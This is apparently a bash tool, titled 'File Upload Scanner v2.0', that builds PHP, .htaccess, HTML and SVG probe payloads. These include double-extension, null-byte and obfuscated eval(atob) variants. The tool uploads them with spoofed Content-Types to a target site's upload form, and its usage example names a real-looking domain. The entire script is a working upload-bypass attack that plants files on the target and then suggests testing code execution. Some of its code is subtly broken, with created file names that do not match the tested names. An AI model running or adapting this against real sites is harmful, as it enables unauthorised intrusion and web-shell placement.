#!/bin/bash
# ============================================
# File Upload Scanner v2.0
# Real PHP, HTML, SVG upload tests
# ============================================

CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ $# -eq 0 ]; then
    echo -e "${RED}Usage: $0 <url> [upload_endpoint]${NC}"
    echo "Example: $0 https://sistemataller.com /prueba-gratis"
    exit 1
fi

TARGET_URL="$1"
UPLOAD_ENDPOINT="${2:-/}"
FULL_URL="${TARGET_URL}${UPLOAD_ENDPOINT}"

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║           FILE UPLOAD SCANNER v2.0 - PHP/HTML/SVG           ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${BLUE}Target:${NC} $TARGET_URL"
echo -e "${BLUE}Endpoint:${NC} $UPLOAD_ENDPOINT"
echo ""

TMPDIR=$(mktemp -d)
VULNS_FOUND=0

# ============================================
# PHASE 1: CREATE PAYLOADS
# ============================================

echo -e "${YELLOW}[1/6] Creating test payloads...${NC}"
echo ""

# PHP Payloads
cat > "$TMPDIR/shell.php" << 'PHPEOF'
<?php echo "VULN_PHP_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.php.jpg" << 'PHPEOF'
<?php echo "VULN_PHP_DOUBLE_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.jpg.php" << 'PHPEOF'
<?php echo "VULN_PHP_REVERSED_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.phtml" << 'PHPEOF'
<?php echo "VULN_PHTML_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/shell.php5" << 'PHPEOF'
<?php echo "VULN_PHP5_".php_uname(); ?>
PHPEOF

cat > "$TMPDIR/.htaccess" << 'HTEOF'
AddType application/x-httpd-php .jpg
HTEOF

# HTML Payloads
cat > "$TMPDIR/shell.html" << 'HTMLEOF'
<html><body><script>document.title="XSS_HTML"</script></body></html>
HTMLEOF

cat > "$TMPDIR/shell.htm" << 'HTMLEOF'
<html><body><script>document.title="XSS_HTM"</script></body></html>
HTMLEOF

cat > "$TMPDIR/shell.html.php" << 'HTMLEOF'
<?php echo "VULN_HTML_PHP"; ?>
<html><body><script>document.title="XSS_HTML_PHP"</script></body></html>
HTMLEOF

# SVG Payloads
cat > "$TMPDIR/shell.svg" << 'SVGEOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script>document.title="XSS_SVG"</script>
</svg>
SVGEOF

cat > "$TMPDIR/shell.svg.php" << 'SVGEOF'
<?php echo "VULN_SVG_PHP"; ?>
<svg xmlns="http://www.w3.org/2000/svg"><script>document.title="XSS_SVG_PHP"</script></svg>
SVGEOF

cat > "$TMPDIR/shell.php.svg" << 'SVGEOF'
<?php echo "VULN_PHP_SVG"; ?>
<svg xmlns="http://www.w3.org/2000/svg"><script>document.title="XSS_PHP_SVG"</script></svg>
SVGEOF

# SVG with advanced payload
cat > "$TMPDIR/shell_advanced.svg" << 'SVGADV'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('ZG9jdW1lbnQuaXRsZT0iWFNTX0FERkFOQ0VEIik='))">
</svg>
SVGADV

# Bypass payloads
echo '<?php echo "BYPASS_00"; ?>' > "$TMPDIR/bypass00.php%00.jpg"
echo '<?php echo "BYPASS_SPACE"; ?>' > "$TMPDIR/bypass space.php"
echo '<?php echo "BYPASS_TAB"; ?>' > "$TMPDIR/bypass	tab.php"
echo '<?php echo "BYPASS_NULL"; ?>' > "$TMPDIR/bypass%00.php"

echo -e "${GREEN}  ✓ Payloads created${NC}"

# ============================================
# PHASE 2: DETECT UPLOAD ENDPOINT
# ============================================

echo ""
echo -e "${YELLOW}[2/6] Detecting upload endpoint...${NC}"
echo ""

# Search for forms with file input
UPLOAD_FOUND=0
curl -s "$TARGET_URL" | grep -oP '<form[^>]*>' | while read -r form; do
    if echo "$form" | grep -qi "file\|upload\|logo\|image"; then
        echo -e "${GREEN}  ✓ Form found: $form${NC}"
        UPLOAD_FOUND=1
    fi
done

# Search for file input
curl -s "$TARGET_URL" | grep -oP '<input[^>]*type=["\x27]file["\x27][^>]*>' | while read -r input; do
    echo -e "${GREEN}  ✓ File input: $input${NC}"
    # shellcheck disable=SC2034
    UPLOAD_FOUND=1
done

# Search for accept
echo ""
echo -e "${CYAN}Accepted types:${NC}"
curl -s "$TARGET_URL" | grep -oP 'accept=["\x27][^"]*["\x27]' | while read -r line; do
    echo "  $line"
done

# ============================================
# PHASE 3: TEST PHP UPLOADS
# ============================================

echo ""
echo -e "${YELLOW}[3/6] Testing PHP uploads...${NC}"
echo ""

PHP_PAYLOADS=(
    "shell.php"
    "shell.php.jpg"
    "shell.jpg.php"
    "shell.phtml"
    "shell.php5"
    ".htaccess"
    "shell.php%00.jpg"
    "shell.php "
    "shell.php."
    "shell.php;"
)

for payload in "${PHP_PAYLOADS[@]}"; do
    FILE="$TMPDIR/$payload"
    if [ -f "$FILE" ]; then
        echo -e "${CYAN}  Testing: $payload${NC}"
        
        # Try upload with different Content-Types
        for ct in "application/x-php" "image/jpeg" "image/png" "application/octet-stream"; do
            RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST "$FULL_URL" \
                -F "file=@$FILE;filename=$payload;type=$ct" \
                2>/dev/null)
            
            if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
                echo -e "${RED}    ⚠️ ACCEPTED with Content-Type: $ct (HTTP $RESP)${NC}"
                VULNS_FOUND=$((VULNS_FOUND + 1))
            fi
        done
    fi
done

# ============================================
# PHASE 4: TEST HTML UPLOADS
# ============================================

echo ""
echo -e "${YELLOW}[4/6] Testing HTML uploads...${NC}"
echo ""

HTML_PAYLOADS=(
    "shell.html"
    "shell.htm"
    "shell.html.php"
    "shell.html%00.php"
    "shell.html "
)

for payload in "${HTML_PAYLOADS[@]}"; do
    FILE="$TMPDIR/$payload"
    if [ -f "$FILE" ]; then
        echo -e "${CYAN}  Testing: $payload${NC}"
        
        for ct in "text/html" "image/svg+xml" "application/octet-stream"; do
            RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST "$FULL_URL" \
                -F "file=@$FILE;filename=$payload;type=$ct" \
                2>/dev/null)
            
            if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
                echo -e "${RED}    ⚠️ ACCEPTED with Content-Type: $ct (HTTP $RESP)${NC}"
                VULNS_FOUND=$((VULNS_FOUND + 1))
            fi
        done
    fi
done

# ============================================
# PHASE 5: TEST SVG UPLOADS
# ============================================

echo ""
echo -e "${YELLOW}[5/6] Testing SVG uploads...${NC}"
echo ""

SVG_PAYLOADS=(
    "shell.svg"
    "shell.svg.php"
    "shell.php.svg"
    "shell_advanced.svg"
    "shell.svg%00.php"
)

for payload in "${SVG_PAYLOADS[@]}"; do
    FILE="$TMPDIR/$payload"
    if [ -f "$FILE" ]; then
        echo -e "${CYAN}  Testing: $payload${NC}"
        
        for ct in "image/svg+xml" "text/html" "application/octet-stream"; do
            RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST "$FULL_URL" \
                -F "file=@$FILE;filename=$payload;type=$ct" \
                2>/dev/null)
            
            if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
                echo -e "${RED}    ⚠️ ACCEPTED with Content-Type: $ct (HTTP $RESP)${NC}"
                VULNS_FOUND=$((VULNS_FOUND + 1))
            fi
        done
    fi
done

# ============================================
# PHASE 6: ADVANCED BYPASSES
# ============================================

echo ""
echo -e "${YELLOW}[6/6] Testing advanced bypasses...${NC}"
echo ""

echo -e "${CYAN}  Bypass payloads:${NC}"
echo ""
echo "    PHP Bypass:"
echo "      shell.php.jpg           - Double extension"
echo "      shell.php%00.jpg        - Null byte"
echo "      shell.php%0a.jpg        - Newline"
echo "      shell.php%0d%0a.jpg     - CRLF"
echo "      shell.pHp               - Case mixing"
echo "      shell.php;.jpg          - Semicolon"
echo "      shell.php::$DATA        - NTFS stream"
echo "      shell.php.              - Trailing dot"
echo "      shell.php...            - Multiple dots"
echo ""
echo "    HTML Bypass:"
echo "      shell.html.php          - PHP after HTML"
echo "      shell.htm               - Short extension"
echo "      shell.html%00.php       - Null byte"
echo ""
echo "    SVG Bypass:"
echo "      shell.svg.php           - PHP after SVG"
echo "      shell.php.svg           - SVG after PHP"
echo "      shell.svg%00.php        - Null byte"
echo ""
echo "    Content-Type Bypass:"
echo "    - Send PHP with Content-Type: image/png"
echo "    - Send HTML with Content-Type: image/jpeg"
echo "    - Send SVG with Content-Type: text/plain"
echo ""

# ============================================
# SUMMARY
# ============================================

echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  TEST SUMMARY${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  Payloads tested: ${CYAN}$(ls $TMPDIR | wc -l)${NC}"
echo -e "  Uploads accepted: ${RED}$VULNS_FOUND${NC}"
echo ""

if [ $VULNS_FOUND -gt 0 ]; then
    echo -e "${RED}  ⚠️ VULNERABILITIES FOUND${NC}"
    echo ""
    echo "  Recommended actions:"
    echo "    1. Verify accepted uploads"
    echo "    2. Test code execution"
    echo "    3. Verify if files are accessible"
    echo "    4. Report to security team"
else
    echo -e "${GREEN}  ✓ No vulnerable uploads found${NC}"
fi

# Clean up
rm -rf "$TMPDIR"

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
